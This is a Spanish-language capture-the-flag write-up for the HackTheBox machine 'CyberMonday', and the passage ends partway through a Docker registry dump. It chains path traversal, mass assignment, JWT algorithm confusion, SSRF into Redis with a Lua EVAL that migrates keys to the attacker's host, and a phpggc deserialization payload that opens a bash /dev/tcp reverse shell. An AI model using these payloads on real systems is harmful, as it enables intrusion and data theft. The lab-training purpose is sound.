---
layout: post
title: CyberMonday
date: 2023-12-02
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/CyberMonday-htb/CyberMonday.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.129.65.44 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 16:13 GMT
Nmap scan report for 10.129.65.44
Host is up (0.23s latency).
Not shown: 65345 closed tcp ports (reset), 188 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.129.65.44 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 16:13 GMT
Nmap scan report for 10.129.65.44
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 74:68:14:1f:a1:c0:48:e5:0d:0a:92:6a:fb:c1:0c:d8 (RSA)
|   256 f7:10:9d:c0:d1:f3:83:f2:05:25:aa:db:08:0e:8e:4e (ECDSA)
|_  256 2f:64:08:a9:af:1a:c5:cf:0f:0b:9b:d2:95:f5:92:32 (ED25519)
80/tcp open  http    nginx 1.25.1
|_http-title: Did not follow redirect to http://cybermonday.htb
|_http-server-header: nginx/1.25.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
```

Añado el dominio ```cybermonday.htb``` al ```/etc/hosts```

# Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.129.65.44
http://10.129.65.44 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.25.1], IP[10.129.65.44], RedirectLocation[http://cybermonday.htb], Title[301 Moved Permanently], nginx[1.25.1]
http://cybermonday.htb [200 OK] Cookies[XSRF-TOKEN,cybermonday_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.25.1], HttpOnly[cybermonday_session], IP[10.129.65.44], PHP[8.1.20], Script, Title[Welcome - Cyber Monday], X-Powered-By[PHP/8.1.20], X-UA-Compatible[IE=edge], nginx[1.25.1]
```

La página principal se ve así:

<img src="/writeups/assets/img/CyberMonday-htb/1.png" alt="">

Se está empleando una versión de ```nginx``` que es vulnerable a ```path traversal via misconfigured nginx alias```. Al realizar fuzzing, encuentro un git

```null
gobuster dir -u 'http://cybermonday.htb/assets../' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cybermonday.htb/assets../
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/22 16:25:46 Starting gobuster in directory enumeration mode
===============================================================
/.git/HEAD            (Status: 200) [Size: 23]
/.git                 (Status: 301) [Size: 169] [--> http://cybermonday.htb/assets../.git/]
/.git/logs/           (Status: 403) [Size: 153]
/.git/config          (Status: 200) [Size: 92]
/.gitattributes       (Status: 200) [Size: 152]
/.gitignore           (Status: 200) [Size: 179]
/.git/index           (Status: 200) [Size: 12277]
```

Lo puedo dumpear con ```git-dumper```. Corresponde a la web que está montada bajo ```cybermonday.htb```

```null
git-dumper 'http://cybermonday.htb/assets../.git' git
```

En el archivo ```database/migrations/2014_10_12_000000_create_users_table.php``` se puede ver una vulnerabilidad de tipo ```Mass Assignment```. El parámetro ```isAdmin``` se puede intentar settear a 1

```null
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('users', function (Blueprint $table) {
            $table->id();
            $table->string('username')->unique();
            $table->string('email')->unique();
            $table->string('password');
            $table->boolean('isAdmin')->default(0);
            $table->rememberToken();
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('users');
    }
};
```

Me registro en la aplicación

<img src="/writeups/assets/img/CyberMonday-htb/2.png" alt="">

En una sección, puedo modificar mi perfil

<img src="/writeups/assets/img/CyberMonday-htb/3.png" alt="">

Intercepto la petición y añado ```isAdmin=1```

```null
_token=L1zEd7k5MJHr4nr97u4NIiLyS1NOAfWLUk8AYdt1&username=rubbx&email=rubbx%40rubbx.com&password=rubbx&password_confirmation=rubbx&isAdmin=1
```

Aparece un nuevo menú llamado ```Dashboard```

<img src="/writeups/assets/img/CyberMonday-htb/4.png" alt="">

En el ```ChangeLog``` se comparte un enlace para un ```webhook```, cuya URL es ```http://webhooks-api-beta.cybermonday.htb/```

<img src="/writeups/assets/img/CyberMonday-htb/5.png" alt="">

Añado este subdominio el ```/etc/hosts```. Le tramito una petición por GET y me devuelve el panel de ayuda

```null
curl -s -X GET http://webhooks-api-beta.cybermonday.htb/ | jq
{
  "status": "success",
  "message": {
    "routes": {
      "/auth/register": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/auth/login": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/webhooks": {
        "method": "GET"
      },
      "/webhooks/create": {
        "method": "POST",
        "params": [
          "name",
          "description",
          "action"
        ]
      },
      "/webhooks/delete:uuid": {
        "method": "DELETE"
      },
      "/webhooks/:uuid": {
        "method": "POST",
        "actions": {
          "sendRequest": {
            "params": [
              "url",
              "method"
            ]
          },
          "createLogFile": {
            "params": [
              "log_name",
              "log_content"
            ]
          }
        }
      }
    }
  }
}
```

Me registro en el servicio

```null
curl -s -X POST http://webhooks-api-beta.cybermonday.htb/auth/register -H "Content-Type: application/json" -d '{"username":"rubbx","password":"rubbx"}' | jq
{
  "status": "success",
  "message": "success"
}
```

E inicio sesión

```null
curl -s -X POST http://webhooks-api-beta.cybermonday.htb/auth/login -H "Content-Type: application/json" -d '{"username":"rubbx","password":"rubbx"}' | jq
{
  "status": "success",
  "message": {
    "x-access-token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJydWJieCIsInJvbGUiOiJ1c2VyIn0.VsdtWVRDOcwDtrGgs_Act9IIOmUM0-0SchExBfWGV2b7N8wFk5qCwjDI24keb0mZqP8YsoT1fZC6MM_Q2pz_9NNtD3dVuzGL44C1tysS-0BnDVPtHlO_p3d9vq6ixwXf9S5lY6R94_IKjxm_2wY_SpfgEuSwxXgBoQKXYWZ9Mw3zlZB9lE9hnDroX3NXYYEhydV9mEwB-uDgxNCGgiFlEZsnnJHMAmIJcb7WalJ6NBxw3Kk90SN1kOZZ42FXSFVrSHSxWBAMDhee5nHBOMo5BanpUEnXt71ywUzdJuQf8HaStpqhFZWIjal2RhPQz-F9MgWZK6OFiSgJn9J8QsEKag"
  }
}
```

El ```x-access-token``` corresponde a un ```Json Web Token```. Desde la web [jwt.io](https://jwt.io) puedo ver como está formado

<img src="/writeups/assets/img/CyberMonday-htb/6.png" alt="">

Como algoritmo se emplea RSA. Para poder realizar acciones privilegiadas, mi rol tiene que corresponder al del usuario admin. Aplico fuzzing dentro de este subdominio

```null
gobuster dir -u http://webhooks-api-beta.cybermonday.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://webhooks-api-beta.cybermonday.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/22 16:48:09 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 200) [Size: 602]
/jwks.json            (Status: 200) [Size: 447]
Progress: 4682 / 4716 (99.28%)
===============================================================
2023/08/22 16:48:18 Finished
===============================================================
```

Encuentra el ```jwks.json```. Existe una técnica llamada [Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion) que puede servir para generar nuevos JWT, abusando de un cambio de algoritmo de RSA a H256. Este archivo contiene valores que me pueden servir para generar una clave pública

```null
curl -s -X GET http://webhooks-api-beta.cybermonday.htb/jwks.json
{
	"keys": [
		{
			"kty": "RSA",
			"use": "sig",
			"alg": "RS256",
			"n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w",
			"e": "AQAB"
		}
	]
}
```

Creo un script en ```python``` para ello. Otra alternativa es utilizar la herramienta [jwt_tool.py](https://raw.githubusercontent.com/ticarpi/jwt_tool/master/jwt_tool.py)

```py
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import base64

# Valores del JSON (en base64 URL-encoded)
n_base64 = "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w"
e_base64 = "AQAB"

# Decodificar valores desde base64 URL-encoded
n = int.from_bytes(base64.urlsafe_b64decode(n_base64 + '=='), byteorder='big')
e = int.from_bytes(base64.urlsafe_b64decode(e_base64 + '=='), byteorder='big')

# Crear la clave pública RSA usando los valores
public_numbers = rsa.RSAPublicNumbers(e, n)
public_key = public_numbers.public_key()

# Obtener la clave pública en formato PEM
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

print(public_key_pem.decode("utf-8"))
```

```null
python3 gen_pub_key.py
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApvezvAKCOgxwsiyV6PRJ
fGMul+WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP/8jJ7WA2gDa8oP3N2J8z
Fyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn7
97IlIYr6Wqfc6ZPn1nsEhOrwO+qSD4Q24FVYeUxsn7pJ0oOWHPD+qtC5q3BR2M/S
xBrxXh9vqcNBB3ZRRA0H0FDdV6Lp/8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhn
gysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh1
6wIDAQAB
-----END PUBLIC KEY-----
```

```null
python3 jwt_tool.py  -t http://webhooks-api-beta.cybermonday.htb/webhooks -rh "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJydWJieCIsInJvbGUiOiJ1c2VyIn0.VsdtWVRDOcwDtrGgs_Act9IIOmUM0-0SchExBfWGV2b7N8wFk5qCwjDI24keb0mZqP8YsoT1fZC6MM_Q2pz_9NNtD3dVuzGL44C1tysS-0BnDVPtHlO_p3d9vq6ixwXf9S5lY6R94_IKjxm_2wY_SpfgEuSwxXgBoQKXYWZ9Mw3zlZB9lE9hnDroX3NXYYEhydV9mEwB-uDgxNCGgiFlEZsnnJHMAmIJcb7WalJ6NBxw3Kk90SN1kOZZ42FXSFVrSHSxWBAMDhee5nHBOMo5BanpUEnXt71ywUzdJuQf8HaStpqhFZWIjal2RhPQz-F9MgWZK6OFiSgJn9J8QsEKag" -V -jw jwks.json

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJydWJieCIsInJvbGUiOiJ1c2VyIn0.VsdtWVRDOcwDtrGgs_Act9IIOmUM0-0SchExBfWGV2b7N8wFk5qCwjDI24keb0mZqP8YsoT1fZC6MM_Q2pz_9NNtD3dVuzGL44C1tysS-0BnDVPtHlO_p3d9vq6ixwXf9S5lY6R94_IKjxm_2wY_SpfgEuSwxXgBoQKXYWZ9Mw3zlZB9lE9hnDroX3NXYYEhydV9mEwB-uDgxNCGgiFlEZsnnJHMAmIJcb7WalJ6NBxw3Kk90SN1kOZZ42FXSFVrSHSxWBAMDhee5nHBOMo5BanpUEnXt71ywUzdJuQf8HaStpqhFZWIjal2RhPQz-F9MgWZK6OFiSgJn9J8QsEKag

JWKS Contents:
Number of keys: 1

--------
Key 1
Key 1
[+] kty = RSA
[+] use = sig
[+] alg = RS256
[+] n = pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w
[+] e = AQAB

Found RSA key factors, generating a public key
[+] kid_0_1692723551.pem

Attempting to verify token using kid_0_1692723551.pem
RSA Signature is VALID
```

```null
cat kid_0_1692723551.pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApvezvAKCOgxwsiyV6PRJ
fGMul+WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP/8jJ7WA2gDa8oP3N2J8z
Fyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn7
97IlIYr6Wqfc6ZPn1nsEhOrwO+qSD4Q24FVYeUxsn7pJ0oOWHPD+qtC5q3BR2M/S
xBrxXh9vqcNBB3ZRRA0H0FDdV6Lp/8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhn
gysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh1
6wIDAQAB
-----END PUBLIC KEY-----
```

Instalo en el ```BurpSuite``` la extensión ```JWT Editor```

<img src="/writeups/assets/img/CyberMonday-htb/7.png" alt="">

Hago click en ```New RSA Key``` y posteriormente en ```Generate``` para que se asigne un identificador

<img src="/writeups/assets/img/CyberMonday-htb/8.png" alt="">

Pego la clave pública

<img src="/writeups/assets/img/CyberMonday-htb/9.png" alt="">

La misma clave, la introduzco en el decoder para convertirla a base64

<img src="/writeups/assets/img/CyberMonday-htb/10.png" alt="">

Hago click en ```New Symmetric Key``` y despúes en generar. Sustituyo el valor de ```k``` por el valor en base64 de la clave pública

<img src="/writeups/assets/img/CyberMonday-htb/11.png" alt="">

Envío al ```Burpsuite``` la petición para crear un webhook

```null
curl -s -X POST http://webhooks-api-beta.cybermonday.htb/webhooks/create -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJydWJieCIsInJvbGUiOiJ1c2VyIn0.VsdtWVRDOcwDtrGgs_Act9IIOmUM0-0SchExBfWGV2b7N8wFk5qCwjDI24keb0mZqP8YsoT1fZC6MM_Q2pz_9NNtD3dVuzGL44C1tysS-0BnDVPtHlO_p3d9vq6ixwXf9S5lY6R94_IKjxm_2wY_SpfgEuSwxXgBoQKXYWZ9Mw3zlZB9lE9hnDroX3NXYYEhydV9mEwB-uDgxNCGgiFlEZsnnJHMAmIJcb7WalJ6NBxw3Kk90SN1kOZZ42FXSFVrSHSxWBAMDhee5nHBOMo5BanpUEnXt71ywUzdJuQf8HaStpqhFZWIjal2RhPQz-F9MgWZK6OFiSgJn9J8QsEKag" -x http:localhost:8080
```

Desde el ```Repeater``` modifico el JWT para que el algoritmo sea ```HS256``` y mi role ```admin```. Doy click en ```Sign``` para firmar y envío

<img src="/writeups/assets/img/CyberMonday-htb/12.png" alt="">

La respuesta cambia con respecto al JWT original

```null
HTTP/1.1 400 Bad Request
Server: nginx/1.25.1
Date: Tue, 22 Aug 2023 18:00:58 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=8f5fdb3b87545ded24c12ae15427ada2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 51

{"status":"error","message":"\"name\" not defined"}
```

Ya no recibo el ```Unauthorized```

```null
curl -s -X POST http://webhooks-api-beta.cybermonday.htb/webhooks/create -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJydWJieCIsInJvbGUiOiJ1c2VyIn0.VsdtWVRDOcwDtrGgs_Act9IIOmUM0-0SchExBfWGV2b7N8wFk5qCwjDI24keb0mZqP8YsoT1fZC6MM_Q2pz_9NNtD3dVuzGL44C1tysS-0BnDVPtHlO_p3d9vq6ixwXf9S5lY6R94_IKjxm_2wY_SpfgEuSwxXgBoQKXYWZ9Mw3zlZB9lE9hnDroX3NXYYEhydV9mEwB-uDgxNCGgiFlEZsnnJHMAmIJcb7WalJ6NBxw3Kk90SN1kOZZ42FXSFVrSHSxWBAMDhee5nHBOMo5BanpUEnXt71ywUzdJuQf8HaStpqhFZWIjal2RhPQz-F9MgWZK6OFiSgJn9J8QsEKag" | jq
{
  "status": "error",
  "message": "Unauthorized"
}
```

Creo un nuevo ```webhook``` con la acción ```sendRequest```

```null
POST /webhooks/create HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/7.88.1
Accept: */*
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJydWJieCIsInJvbGUiOiJhZG1pbiJ9.bsb1EJW-SlTxHvyBRHcxT4Btw2OYoBiA2Ga3jpDmXSE
Content-Type: application/json
Content-Length: 61
Connection: close

{"name":"test", "description":"test", "action":"sendRequest"}
```

```null
HTTP/1.1 201 Created
Server: nginx/1.25.1
Date: Tue, 22 Aug 2023 18:03:09 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=f18869597b679122d1473484f7ba7065; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 181

{"status":"success","message":"Done! Send me a request to execute the action, as the event listener is still being developed.","webhook_uuid":"4c14d3e8-f245-4fb1-b813-d4d37b7621d9"}
```

Puedo tramitar peticiones a una url a través de un método

```null
POST /webhooks/4c14d3e8-f245-4fb1-b813-d4d37b7621d9 HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/7.88.1
Accept: */*
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJydWJieCIsInJvbGUiOiJhZG1pbiJ9.bsb1EJW-SlTxHvyBRHcxT4Btw2OYoBiA2Ga3jpDmXSE
Content-Type: application/json
Content-Length: 44
Connection: close

{"url":"http://10.10.16.12", "method":"GET"}
```

```null
HTTP/1.1 200 OK
Server: nginx/1.25.1
Date: Tue, 22 Aug 2023 18:10:44 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=47d5c95e1bc31cfc85024a40a2cb7d46; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 271

{"status":"success","message":"URL is live","response":"<!DOCTYPE HTML>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Directory listing for \/<\/title>\n<\/head>\n<body>\n<h1>Directory listing for \/<\/h1>\n<hr>\n<ul>\n<\/ul>\n<hr>\n<\/body>\n<\/html>\n"}
```

Es posible modificar cabeceras a través del parámetro ```method```

```null
{"url":"http://10.10.16.12", "method":"GET / HTTP/1.1\nHost: cybermonday.htb\n\n"}
```

Me traigo el archivo ```.env``` abusando del path traversal para ver las variables de entorno

```null
curl -s -X GET http://cybermonday.htb/assets../.env
APP_NAME=CyberMonday
APP_ENV=local
APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
APP_DEBUG=true
APP_URL=http://cybermonday.htb

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=db
DB_PORT=3306
DB_DATABASE=cybermonday
DB_USERNAME=root
DB_PASSWORD=root

BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DISK=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=redis
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=redis
REDIS_PASSWORD=
REDIS_PORT=6379
REDIS_PREFIX=laravel_session:
CACHE_PREFIX=

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"

CHANGELOG_PATH="/mnt/changelog.txt"

REDIS_BLACKLIST=flushall,flushdb
```

Se está empleando ```redis``` como base de datos. Creo un servicio como tal en mi equipo

```null
redis-server --protected-mode no
```

Utilizo la función eval para ejecutar código en ```lua``` y moverme las KEYS a mi servidor

```null
{"url":"http://redis:6379/", "method":"EVAL 'for k,v in pairs(redis.call(\"KEYS\", \"*\")) do redis.pcall(\"MIGRATE\",\"10.10.16.12\",\"6379\",v,0,200) end' 0\r\n*1\r\n$20\r\n"}
```

Después creo una copia del servicio original en mi equipo

```null
{"url":"http://redis:6379/","method":"REPLICAOF <your ip> 6379\r\n\r\n"}
```

Le asigno permisos de escritura

```null
{"url":"http://redis:6379/", "method":"CONFIG SET read-replica-only no\r\n\r\n"}
```

Con ```redis-cli``` me puedo conectar y obtener el ```laravel_session```, que contiene data serializada

```null
redis-cli
127.0.0.1:6379> keys *
1) "laravel_session:1wrmNT5C4EWLecjow1EERpUhvYa23Sa5PQNlgGja"
127.0.0.1:6379> get laravel_session:1wrmNT5C4EWLecjow1EERpUhvYa23Sa5PQNlgGja
"s:180:\"a:3:{s:6:\"_token\";s:40:\"6ga4KqJCsK7rKCpBgJm2zYcZGXaNkDDzKdJWgdMj\";s:9:\"_previous\";a:1:{s:3:\"url\";s:22:\"http://cybermonday.htb\";}s:6:\"_flash\";a:2:{s:3:\"old\";a:0:{}s:3:\"new\";a:0:{}}}\";"
```

Creo un payload serializado con ```phpgcc```

```null
./phpggc -f -a Laravel/RCE16 system 'bash -c "bash -i >& /dev/tcp/10.10.16.12/443 0>&1 2<&1"'
PHP Deprecated:  Creation of dynamic property PHPGGC\Enhancement\ASCIIStrings::$full is deprecated in /home/rubbx/Desktop/HTB/Machines/CyberMonday/git/phpggc/lib/PHPGGC/Enhancement/ASCIIStrings.php on line 16
a:2:{i:7;O:35:"Monolog\Handler\RotatingFileHandler":4:{S:13:"\00*\00mustRotate";b:1;S:11:"\00*\00filename";S:8:"anything";S:17:"\00*\00filenameFormat";O:38:"Illuminate\Validation\Rules\RequiredIf":1:{S:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{S:11:"\00*\00callback";S:14:"call_user_func";S:10:"\00*\00request";S:6:"system";S:11:"\00*\00provider";S:55:"bash -c "bash -i >& /dev/tcp/10.10.16.12/443 0>&1 2<&1"";}i:1;S:4:"user";}}S:13:"\00*\00dateFormat";S:1:"l";}i:7;i:7;}
```

Y lo introduzco en mi ```laravel_session```

```null
127.0.0.1:6379> set 'laravel_session:nKchITwFVrLGwbRm54h7i4VFv8bGKdxed8q8gQGx' 'a:2:{i:7;O:35:"Monolog\Handler\RotatingFileHandler":4:{S:13:"\00*\00mustRotate";b:1;S:11:"\00*\00filename";S:8:"anything";S:17:"\00*\00filenameFormat";O:38:"Illuminate\Validation\Rules\RequiredIf":1:{S:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{S:11:"\00*\00callback";S:14:"call_user_func";S:10:"\00*\00request";S:6:"system";S:11:"\00*\00provider";S:55:"bash -c "bash -i >& /dev/tcp/10.10.16.12/443 0>&1 2<&1"";}i:1;S:4:"user";}}S:13:"\00*\00dateFormat";S:1:"l";}i:7;i:7;}'
OK
```

Gano acceso al sistema en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.216.7] 53546
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@070370e2cdc4:~/html/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@070370e2cdc4:~/html/public$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@070370e2cdc4:~/html/public$ export TERM=xterm-color
www-data@070370e2cdc4:~/html/public$ export SHELL=bash
www-data@070370e2cdc4:~/html/public$ stty rows 55 columns 209
www-data@070370e2cdc4:~/html/public$ source /etc/skel/.bashrc 
```

Estoy dentro de un contenedor

```null
www-data@070370e2cdc4:~/html/public$ hostname -I
172.18.0.3 
```

Utilizo ```chisel``` para aplicar ```Dinamic Port Forwarding```. Como el contenedor no tiene ```curl``` ni ```wget``` ni ningún otro binario que me permita descargar archivos, utilizo una función de ```bash``` que mediante descriptores de archivo me permite llevarlo a cabo

```bash
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
```

En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

Desde el contenedor me conecto como cliente

```null
www-data@070370e2cdc4:/tmp$ ./chisel client 10.10.16.12:1234 R:socks &>/dev/null & disown
```

Para la IP ```172.18.0.2``` el puerto 5000, correspondiente a ```docker``` está abierto. Puedo tramitarle una petición por GET y obtener las imágenes

```null
proxychains curl -s -X GET 172.18.0.2:5000/v2/_catalog | jq
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
{
  "repositories": [
    "cybermonday_api"
  ]
}
```

Utilizo [DockerGraber](https://github.com/Syzik/DockerRegistryGrabber) para dumpear los blobs

```null
proxychains python3 DockerGraber.py http://172.18.0.2 --dump_all
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[+]======================================================[+]
